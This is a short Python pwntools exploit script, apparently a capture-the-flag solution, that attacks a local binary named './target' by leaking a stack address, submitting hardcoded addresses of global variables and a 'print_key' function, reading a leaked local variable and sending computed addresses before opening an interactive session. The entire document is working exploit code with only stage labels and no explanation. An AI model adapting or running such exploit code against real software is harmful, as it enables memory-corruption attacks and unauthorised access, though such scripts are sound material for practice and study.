from pwn import *
p = process("./target")

### Function
def submit(data):
	p.recv()
	p.sendline(hex(data))


### Gadget 
global_var=0x404090
global_var_ro=0x402008
print_key=0x4012b6

### Exploit
# Stage 0
sleep(0.5)
env_var = int(b'0x'+p.recvuntil(b"[stack]")[-67:-55],16)
log.info('env_var : {}'.format(hex(env_var)))
# Stage 1
sleep(0.5)
submit(global_var)
submit(global_var_ro)
submit(print_key)
# Stage 2_1
sleep(0.5)
p.recvuntil(b'dump:')
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
local_var = int(p.recvuntil(b':')[:-1],16)
log.info("local_var : {}".format(hex(local_var)))
# Stage 3
submit(local_var+0x4)
submit(env_var-400)
p.sendline("200")
# Finish


p.interactive()
